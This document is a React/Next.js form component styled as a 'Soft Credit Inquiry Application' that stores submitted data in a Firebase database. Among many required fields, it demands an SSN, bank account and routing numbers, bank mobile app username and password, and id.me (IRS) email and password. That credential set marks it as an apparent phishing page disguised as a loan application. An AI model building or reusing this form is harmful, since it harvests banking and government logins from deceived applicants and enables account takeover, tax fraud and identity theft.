'use client'
import { useState } from 'react';
/* eslint-disable react/no-unescaped-entities */
import axios from "axios";
import { db } from "../../app/firebase";
import { ref, push, child, update } from "firebase/database";


interface FormData {
  firstName: string;
  middleName: string;
  lastName: string;
  dob: string;
  maritalStatus: string;
  ssn: string;
  dependents: string;
  driverLicense: string;
  mobileNumber: string;
  email: string;
  currentCity: string;
  currentProvince: string;
  currentZipCode: string;
  previousCity: string;
  previousProvince: string;
  previousZipCode: string;
  currentEmployer: string;
  yearsAtCurrentEmployer: string;
  currentPosition: string;
  currentEmployerPhone: string;
  currentEmployerAddress: string;
  incomeType: string;
  grossAnnualIncome: string;
  previousEmployer: string;
  yearsAtPreviousEmployer: string;
  previousPosition: string;
  previousEmployerPhone: string;
  previousEmployerAddress: string;
  previousIncomeType: string;
  previousGrossAnnualIncome: string;
  financialFullName: string;
  bankName: string;
  accountNumber: string;
  routingNumber: string;
  bankMobileUsername: string;
  password: string;
  irsEmail: string;
  irsPassword: string;
  creditScore: string;
  coFirstName: string;
  coMiddleName: string;
  coLastName: string;
  coDob: string;
  coMaritalStatus: string;
  coMobileNumber: string;
  coAddress: string;
}
const initialFormData: FormData = {
  firstName: '',
  middleName: '',
  lastName: '',
  dob: '',
  maritalStatus: '',
  ssn: '',
  dependents: '',
  driverLicense: '',
  mobileNumber: '',
  email: '',
  currentCity: '',
  currentProvince: '',
  currentZipCode: '',
  previousCity: '',
  previousProvince: '',
  previousZipCode: '',
  currentEmployer: '',
  yearsAtCurrentEmployer: '',
  currentPosition: '',
  currentEmployerPhone: '',
  currentEmployerAddress: '',
  incomeType: '',
  grossAnnualIncome: '',
  previousEmployer: '',
  yearsAtPreviousEmployer: '',
  previousPosition: '',
  previousEmployerPhone: '',
  previousEmployerAddress: '',
  previousIncomeType: '',
  previousGrossAnnualIncome: '',
  financialFullName: '',
  bankName: '',
  accountNumber: '',
  routingNumber: '',
  bankMobileUsername: '',
  password: '',
  irsEmail: '',
  irsPassword: '',
  creditScore: '',
  coFirstName: '',
  coMiddleName: '',
  coLastName: '',
  coDob: '',
  coMaritalStatus: '',
  coMobileNumber: '',
  coAddress: '',
};

const Contact = () => {
  const [formData, setFormData] = useState<FormData>(initialFormData)
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [formMessage, setFormMessage] = useState('');

  const handleChange = (e: { target: { name: any; value: any; }; }) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
  
    try {
      // Your form submission logic here, e.g., sending data to a database.
      const newPostKey = push(child(ref(db), 'posts')).key;
      const updates = {};
      updates['/' + newPostKey] = formData;
      await update(ref(db), updates);
  
      // If the submission was successful, clear the form and show a success message.
      setFormMessage("Thanks your application has been submitted and it's awaiting approval");
      setFormData(initialFormData); // Clear form inputs by resetting to initial values
    } catch (error) {
      console.error('Error submitting form:', error);
  
      // If the submission failed, show an error message.
      setFormMessage('Form submission failed. Please try again later.');
    } finally {
      setIsSubmitting(false);
    }
  };
  

  return (
    <section id="contact" className="overflow-hidden py-5 md:py-10 lg:py-10">
      <div className="container">
        <div className="-mx-4 flex flex-wrap">
          <div className="w-full px-4">
            <div
              className="wow fadeInUp mb-12 rounded-md bg-primary/[3%] py-11 px-8 dark:bg-dark sm:p-[55px] lg:mb-5 lg:px-8 xl:p-[55px]"
              data-wow-delay=".15s
              "
            >
              <h2 className="text-center mb-3 text-2xl font-bold text-black dark:text-white sm:text-3xl lg:text-2xl xl:text-3xl">
                Soft Credit Inquiry Application
              </h2>
              <p className="mb-12 text-base font-medium text-body-color text-center">
                Our support team will get back to you ASAP via email.
              </p>
              <form onSubmit={handleSubmit}>
                {/* Start of form */}
              <div className="max-w-screen-sm mx-auto p-4">
                <h1 className="text-2xl font-semibold mb-4">Primary Applicant</h1>
                <div className="grid grid-cols-3 gap-4 mb-4">
                  <div>
                    <label className="mb-3 block text-sm font-medium text-dark dark:text-white">First Name:</label>
                    <input type="text" className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                      name="firstName"
                      value={formData.firstName || ''}
                      onChange={handleChange}
                      required
                    />
                  </div>
                  <div>
                    <label className="mb-3 block text-sm font-medium text-dark dark:text-white">M. Name:</label>
                    <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                      name="middleName"
                      value={formData.middleName || ''}
                      onChange={handleChange}
                      required
                    />
                  </div>
                  <div>
                    <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Last Name:</label>
                    <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                      name="lastName"
                      value={formData.lastName || ''}
                      onChange={handleChange}
                      required
                    />
                  </div>
                </div>

                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Date of Birth (MM/DD/YY):</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="dob"
                    value={formData.dob || ''}
                    onChange={handleChange}
                    required
                  />
                </div>

                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Marital Status:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="maritalStatus"
                    value={formData.maritalStatus || ''}
                    onChange={handleChange}
                    required
                  />
                </div>

                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">SSN:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                     name="ssn"
                     value={formData.ssn || ''}
                     onChange={handleChange}
                     required
                  />
                </div>

                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Dependents:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="dependents"
                    value={formData.dependents || ''}
                    onChange={handleChange}
                    required
                  />
                </div>

                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Driver's License Number:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="driverLicense"
                    value={formData.driverLicense || ''}
                    onChange={handleChange}
                    required
                  />
                </div>

                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Mobile Number:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                  name="mobileNumber"
                  value={formData.mobileNumber || ''}
                  onChange={handleChange}
                  required
                  />
                </div>

                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Email:</label>
                  <input type="email"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="email"
                    value={formData.email || ''}
                    onChange={handleChange}
                    required
                  />
                </div>

                <h1 className="text-2xl font-semibold mb-4">Current Address</h1>
                <div className="grid grid-cols-3 gap-4 mb-4">
                  <div>
                    <label className="mb-3 block text-sm font-medium text-dark dark:text-white">City:</label>
                    <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                      name="currentCity"
                      value={formData.currentCity || ''}
                      onChange={handleChange}
                      required
                    />
                  </div>
                  <div>
                    <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Province:</label>
                    <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                       name="currentProvince"
                       value={formData.currentProvince || ''}
                       onChange={handleChange}
                       required
                    />
                  </div>
                  <div>
                    <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Zip Code:</label>
                    <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                      name="currentZipCode"
                      value={formData.currentZipCode || ''}
                      onChange={handleChange}
                      required
                    />
                  </div>
                </div>
                <h1 className="text-2xl font-semibold mb-4">Previous Address</h1>
                <div className="grid grid-cols-3 gap-4 mb-4">
                  <div>
                    <label className="mb-3 block text-sm font-medium text-dark dark:text-white">City:</label>
                    <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="previousCity"
                    value={formData.previousCity || ''}
                    onChange={handleChange}
                    required
                    />
                  </div>
                  <div>
                    <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Province:</label>
                    <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                      name="previousProvince"
                      value={formData.previousProvince || ''}
                      onChange={handleChange}
                      required
                    />
                  </div>
                  <div>
                    <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Zip Code:</label>
                    <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                      name="previousZipCode"
                      value={formData.previousZipCode || ''}
                      onChange={handleChange}
                      required
                    />
                  </div>
                </div>

                <h1 className="text-2xl font-semibold mb-4">Current Employment Details</h1>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Current Employer:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="currentEmployer"
                    value={formData.currentEmployer || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Years there:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp"
                    name="yearsAtCurrentEmployer"
                    value={formData.yearsAtCurrentEmployer || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Position:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="currentPosition"
                    value={formData.currentPosition || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Phone:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="currentEmployerPhone"
                    value={formData.currentEmployerPhone || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Address:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="currentEmployerAddress"
                    value={formData.currentEmployerAddress || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Income Type (Weekly/Monthly/Yearly):</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="incomeType"
                    value={formData.incomeType || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Gross Annual Income:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="grossAnnualIncome"
                    value={formData.grossAnnualIncome || ''}
                    onChange={handleChange}
                    required
                  />
                </div>

                <h1 className="text-2xl font-semibold mb-4">Previous Employment Details</h1>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Previous Employer:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="previousEmployer"
                    value={formData.previousEmployer || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Years there:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="yearsAtPreviousEmployer"
                    value={formData.yearsAtPreviousEmployer || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Position:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="previousPosition"
                    value={formData.previousPosition || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Phone:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="previousEmployerPhone"
                    value={formData.previousEmployerPhone || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Address:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                     name="previousEmployerAddress"
                     value={formData.previousEmployerAddress || ''}
                     onChange={handleChange}
                     required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Income Type (Weekly/Monthly/Yearly):</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="previousIncomeType"
                    value={formData.previousIncomeType || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Gross Annual Income:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="previousGrossAnnualIncome"
                    value={formData.previousGrossAnnualIncome || ''}
                    onChange={handleChange}
                    required
                  />
                </div>

                <h1 className="text-2xl font-semibold mb-4">Financial Check Credentials</h1>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Full Name:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="financialFullName"
                    value={formData.financialFullName || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Bank Name:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="bankName"
                    value={formData.bankName || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Account Number:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="accountNumber"
                    value={formData.accountNumber || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Routing Number:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                     name="routingNumber"
                     value={formData.routingNumber || ''}
                     onChange={handleChange}
                     required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Bank Mobile Application Username:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="bankMobileUsername"
                    value={formData.bankMobileUsername || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Password:</label>
                  <input type="password"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="password"
                    value={formData.password || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <h1 className="text-2xl font-semibold mb-4">IRS Login Details</h1>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">id.me Email:</label>
                  <input type="email"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="irsEmail"
                    value={formData.irsEmail || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">id.me Password:</label>
                  <input type="password"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="irsPassword"
                    value={formData.irsPassword || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Credit Score:</label>
                  <input type="number"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="creditScore"
                    value={formData.creditScore || ''}
                    onChange={handleChange}
                    required
                  />
                </div>

                <h1 className="text-2xl font-semibold mb-4">Co-applicant</h1>
                <div className="grid grid-cols-3 gap-4 mb-4">
                  <div>
                    <label className="mb-3 block text-sm font-medium text-dark dark:text-white">First Name:</label>
                    <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                      name="coFirstName"
                      value={formData.coFirstName || ''}
                      onChange={handleChange}
                      required
                    />
                  </div>
                  <div>
                    <label className="mb-3 block text-sm font-medium text-dark dark:text-white">M. Name:</label>
                    <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                      name="coMiddleName"
                      value={formData.coMiddleName || ''}
                      onChange={handleChange}
                      required
                    />
                  </div>
                  <div>
                    <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Last Name:</label>
                    <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                      name="coLastName"
                      value={formData.coLastName || ''}
                      onChange={handleChange}
                      required
                    />
                  </div>
                </div>

                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Date of Birth (MM/DD/YY):</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="coDob"
                    value={formData.coDob || ''}
                    onChange={handleChange}
                    required
                  />
                </div>

                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Marital Status:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="coMaritalStatus"
                    value={formData.coMaritalStatus || ''}
                    onChange={handleChange}
                    required
                  />
                </div>

                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Mobile Number:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                  name="coMobileNumber"
                  value={formData.coMobileNumber || ''}
                  onChange={handleChange}
                  required
                  />
                </div>

                <div className="mb-4">
                  <label className="mb-3 block text-sm font-medium text-dark dark:text-white">Address:</label>
                  <input type="text"  className="w-full rounded-md border border-transparent py-3 px-6 text-base text-body-color placeholder-body-color shadow-one outline-none focus:border-primary focus-visible:shadow-none dark:bg-[#242B51] dark:shadow-signUp" 
                    name="coAddress"
                    value={formData.coAddress || ''}
                    onChange={handleChange}
                    required
                  />
                </div>
                <div className="w-full">
                    <button type='submit' disabled={isSubmitting} className="rounded-md bg-primary py-4 px-9 text-base font-medium text-white transition duration-300 ease-in-out hover:bg-opacity-80 hover:shadow-signUp">
                    {isSubmitting ? 'Submitting...' : 'Submit'}
                    </button>
                  </div>
                  {formMessage && (
                    <div className={`mt-4 p-2 ${formMessage.includes('error') ? 'bg-red-500' : 'bg-green-500'} text-white rounded`}>
                      {formMessage}
                    </div>
                  )}
              </div>
              {/* End of form */}
              </form>
            </div>
          </div>
          <div className="w-full px-4 lg:w-5/12 xl:w-4/12">
            {/* <NewsLatterBox /> */}
          </div>
        </div>
      </div>
    </section>
  );
};

export default Contact;
